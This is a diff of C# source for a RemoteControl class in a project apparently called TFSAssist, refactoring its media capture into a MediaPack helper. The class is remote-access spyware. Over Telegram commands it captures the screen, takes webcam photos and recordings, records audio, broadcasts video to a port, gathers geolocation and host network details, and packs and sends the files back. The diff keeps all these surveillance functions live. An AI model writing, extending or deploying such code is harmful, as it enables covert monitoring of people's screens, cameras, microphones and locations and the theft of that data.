@@ -2,8 +2,6 @@
 using System.Collections.Generic;
 using System.Device.Location;
 using System.Diagnostics;
-using System.Drawing;
-using System.Drawing.Imaging;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
@@ -19,22 +17,20 @@ using Utils;
 using Utils.AppUpdater;
 using Utils.Handles;
 using Utils.Telegram;
-using Utils.WinForm.MediaCapture;
 
 namespace TFSAssist.Remoter
 {
     public class RemoteControl : IDisposable
     {
+        private readonly object syncSession = new object();
+
         public Thread MainThread { get; }
 
         private readonly string ClientID;
         private TTLControl _control;
         private readonly StringBuilder _processingErrorLogs;
 
-        private AForgeMediaDevices _aforgeDevices = null;
-        private EncoderMediaDevices _encDevices = null;
-        private AForgeCapture _aforgeCapture;
-        private EncoderCapture _encoderCapture;
+        private MediaPack _mediaPack;
 
         private GeoCoordinateWatcher _watcher;
         private string _locationResult = string.Empty;
@@ -92,7 +88,11 @@ namespace TFSAssist.Remoter
             await InitTempDirectory(TempDirectory);
             await InitTempSession();
 
-            InitCamCapture(TempDirectory); // только после InitTempDirectory
+            // только после InitTempDirectory
+            _mediaPack = new MediaPack(MainThread, TempDirectory);
+            _mediaPack.OnCompleted += _mediaPack_OnCompleted;
+            _mediaPack.ProcessingExceptions += _mediaPack_ProcessingExceptions;
+            _mediaPack.Initialize();
 
             await Connect(GetAuthCode);
 
@@ -105,6 +105,7 @@ namespace TFSAssist.Remoter
 
             return IsEnabled;
         }
+
 
         async Task Connect(Func<Task<string>> getAuthCode)
         {
@@ -223,7 +224,7 @@ namespace TFSAssist.Remoter
         }
 
 
-        private readonly object syncSession = new object();
+        
 
         public async Task Run()
         {
@@ -376,7 +377,7 @@ namespace TFSAssist.Remoter
 
                                 foreach (var address in hostIps)
                                 {
-                                    detInfo.Append($"{address.Interface.Name} {new string('.', maxLenghtSpace - address.Interface.Name.Length)} [{address.IPAddress.Address.ToString()}] ({address.Interface.Description})\r\n");
+                                    detInfo.Append($"{address.Interface.Name} {new string('.', maxLenghtSpace - address.Interface.Name.Length)} [{address.IPAddress.Address}] ({address.Interface.Description})\r\n");
                                 }
 
                                 string whiteSpace = "=";
@@ -432,12 +433,6 @@ namespace TFSAssist.Remoter
                                 SendMessageToUserHost(result);
                                 break;
 
-                            case RemoteControlCommands.SCREEN:
-
-                                string imagePath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
-                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
-                                break;
-
                             case RemoteControlCommands.CPU:
                                 Process proc = Process.GetCurrentProcess();
 
@@ -465,134 +460,84 @@ namespace TFSAssist.Remoter
                                 }
                                 break;
 
-                            case RemoteControlCommands.CAMINFO:
-                                string currentDevices = string.Empty;
-                                string resultCamInfo = string.Empty;
-                                if (_aforgeDevices != null)
-                                {
-                                    if (_aforgeCapture != null)
-                                        currentDevices = $"AForge:\r\n{_aforgeCapture.ToString()}";
-                                    resultCamInfo = _aforgeDevices.ToString();
-                                }
-
-                                if (_encDevices != null)
-                                {
-                                    if (_encoderCapture != null)
-                                        currentDevices = currentDevices + $"\r\nEncoder:\r\n{_encoderCapture.ToString()}";
-                                    resultCamInfo = resultCamInfo + "\r\n\r\n" + _encDevices.ToString();
-                                }
-
-                                resultCamInfo = resultCamInfo.Trim();
-
-                                if (resultCamInfo.IsNullOrEmptyTrim())
-                                    SendMessageToUserHost("No device found.");
-                                else
-                                    SendMessageToUserHost(currentDevices.Trim() + "\r\n===================\r\n" + resultCamInfo);
+                            case RemoteControlCommands.MEDIA:
+                                SendMessageToUserHost(_mediaPack.ToString());
                                 break;
 
-                            case RemoteControlCommands.CAMSETT:
-                                int exceptionCount = 0;
+                            case RemoteControlCommands.RECSETT:
                                 if (options != null && options.Count > 0)
                                 {
                                     if (options.TryGetValue("Seconds", out var timeRecStr))
                                     {
                                         if (int.TryParse(timeRecStr, out var timeRec))
                                         {
-                                            if (_aforgeCapture != null)
-                                                _aforgeCapture.SecondsRecordDuration = timeRec;
-                                            if (_encoderCapture != null)
-                                                _encoderCapture.SecondsRecordDuration = timeRec;
+                                            _mediaPack.SetSeconds(timeRec);
                                         }
                                     }
 
                                     if (options.TryGetValue("Video", out var video))
                                     {
-                                        try
-                                        {
-                                            _aforgeCapture?.ChangeVideoDevice(video);
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            exceptionCount++;
-                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
-                                        }
-
-                                        try
-                                        {
-                                            _encoderCapture?.ChangeVideoDevice(video);
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            exceptionCount++;
-                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
-                                        }
+                                        _mediaPack.SetVideo(video);
                                     }
 
                                     if (options.TryGetValue("Audio", out var audio))
                                     {
-                                        try
-                                        {
-                                            _encoderCapture?.ChangeAudioDevice(audio);
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            exceptionCount++;
-                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
-                                        }
+                                        _mediaPack.SetAudio(audio);
                                     }
 
-                                    if (exceptionCount > 0)
-                                        SendMessageToUserHost($"Errors=[{exceptionCount}]");
+                                    if (options.TryGetValue("Frames", out var framesRateStr))
+                                    {
+                                        if (int.TryParse(framesRateStr, out var framesRate))
+                                        {
+                                            _mediaPack.SetFrames(framesRate);
+                                        }
+                                    }
                                 }
 
                                 break;
 
                             case RemoteControlCommands.ACAM:
-                                _aforgeCapture?.StartCamRecording();
+                                _mediaPack.StartAForge();
                                 break;
 
                             case RemoteControlCommands.ECAM:
-                                _encoderCapture?.StartCamRecording();
+                                _mediaPack.StartEncoder();
                                 break;
 
                             case RemoteControlCommands.BROADCAST:
-                                if (_encoderCapture == null)
-                                    break;
-
                                 if (options != null && options.Count > 0)
                                 {
                                     if (options.TryGetValue("Port", out var portStr))
                                     {
                                         if (int.TryParse(portStr, out var port))
                                         {
-                                            _encoderCapture.StartBroadcast(port);
+                                            _mediaPack.StartBroadcast(port);
                                             break;
                                         }
                                     }
                                 }
 
-                                _encoderCapture.StartBroadcast();
+                                _mediaPack.StartBroadcast();
                                 break;
 
-                            case RemoteControlCommands.STOPCAM:
-                                _aforgeCapture?.Stop();
-                                _encoderCapture?.Stop();
+                            case RemoteControlCommands.SCAM:
+                                _mediaPack.StartScreen();
+                                break;
+
+                            case RemoteControlCommands.NCAM:
+                                _mediaPack.StartNAudio();
+                                break;
+
+                            case RemoteControlCommands.RECSTOP:
+                                _mediaPack.Stop();
+                                break;
+
+                            case RemoteControlCommands.SCREEN:
+                                _mediaPack.GetScreen();
                                 break;
 
                             case RemoteControlCommands.PHOTO:
-                                if (_aforgeCapture == null)
-                                    break;
-
-                                Task<Bitmap> task = _aforgeCapture.GetPictureAsync();
-                                if (task.Wait(20000))
-                                {
-                                    var photo = task.Result;
-                                    if (photo != null)
-                                    {
-                                        string photoPath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
-                                        photo.Save(photoPath, ImageFormat.Png);
-                                    }
-                                }
+                                _mediaPack.GetPhoto();
                                 break;
 
                             //case RemoteControlCommands.KILL:
@@ -674,7 +619,7 @@ namespace TFSAssist.Remoter
             }
             finally
             {
-                SendPreparedFiles(projectDirPath);
+                PackAndSendFiles(projectDirPath);
 
                 // выполняется всегда в конце после обработки других комманд, если они были
                 try
@@ -695,9 +640,8 @@ namespace TFSAssist.Remoter
             }
         }
 
-        private object syncSendingFiles = new object();
 
-        void SendPreparedFiles(string projectDirPath)
+        void PackAndSendFiles(string projectDirPath)
         {
             var tempFiles = Directory.EnumerateFiles(projectDirPath, "*", SearchOption.AllDirectories);
 
@@ -881,9 +825,6 @@ namespace TFSAssist.Remoter
         }
 
 
-
-
-
         async Task InitTempSession()
         {
             try
@@ -986,81 +927,14 @@ namespace TFSAssist.Remoter
             }
         }
 
-        void InitCamCapture(string projectDirPath)
+        private void _mediaPack_OnCompleted(object sender, string destinationFile)
         {
-            try
-            {
-                _aforgeDevices = new AForgeMediaDevices();
-            }
-            catch (Exception ex)
-            {
-                WriteExLog(ex);
-            }
-
-            try
-            {
-                _encDevices = new EncoderMediaDevices();
-            }
-            catch (Exception ex)
-            {
-                WriteExLog(ex);
-            }
-
-            try
-            {
-                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 10);
-                _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
-                _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
-            }
-            catch (Exception ex)
-            {
-                WriteExLog(ex);
-            }
-
-            try
-            {
-                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 60);
-                _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
-            }
-            catch (Exception ex)
-            {
-                WriteExLog(ex);
-            }
+            PackAndSendFiles(destinationFile);
         }
 
-        private void OnUnexpectedError(object sender, MediaCaptureEventArgs args)
+        private void _mediaPack_ProcessingExceptions(string log)
         {
-            WriteExLog($"AForge Unexpected Error=[{args?.Error?.ToString()}]");
-        }
-
-        private async void OnRecordingCompleted(object sender, MediaCaptureEventArgs args)
-        {
-            if (args == null)
-                return;
-            if (args.Error != null)
-                WriteExLog(args.Error);
-
-            if (string.IsNullOrWhiteSpace(args.DestinationFile) || !File.Exists(args.DestinationFile))
-                return;
-
-            int tryCount = 0;
-            while (!IO.IsFileReady(args.DestinationFile))
-            {
-                if (tryCount >= 5)
-                    return;
-
-                await Task.Delay(1000);
-                tryCount++;
-            }
-
-            if (sender is IMediaCapture mediaCapture)
-            {
-                SendPreparedFiles(mediaCapture.DestinationDir);
-            }
-            else
-            {
-                WriteExLog($"Sender is not [{nameof(IMediaCapture)}] when recording completed.");
-            }
+            WriteExLog(log);
         }
 
         #region LOGS
@@ -1095,8 +969,6 @@ namespace TFSAssist.Remoter
         }
 
         #endregion
-
-
 
         public void Dispose()
         {
